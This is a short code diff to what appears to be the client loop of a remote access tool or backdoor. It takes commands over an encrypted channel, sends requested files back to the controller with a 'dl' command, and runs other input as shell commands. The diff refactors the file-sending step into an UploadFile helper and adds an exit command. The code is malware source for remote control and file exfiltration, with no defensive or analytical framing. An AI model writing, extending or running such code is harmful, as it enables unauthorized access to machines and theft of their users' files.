@@ -58,15 +58,7 @@ while True:
     elif "dl" in command :
         split_command = command.split()
         try :
-            encrypter.send_message_client(("downloading"))
-            fileToOpen = open(split_command[1], "rb")
-            fileRead = fileToOpen.read(4096-32)
-            while fileRead != b'':
-                encrypter.send_raw_data_client(fileRead)
-                fileRead = fileToOpen.read(4096-32)
-            fileToOpen.close()
-            time.sleep(0.5)
-            encrypter.send_raw_data_client(b'completed')
+            encrypter.UploadFile(split_command[1])
         except:
            encrypter.send_message_client(("permissionsfailed"))
 
@@ -88,7 +80,8 @@ while True:
 
         else :
             encrypter.send_message_client(("ALREADY DEACTIVATED"))
-
+    elif command == "exit" :
+        break
  
     else:
         # do shell command
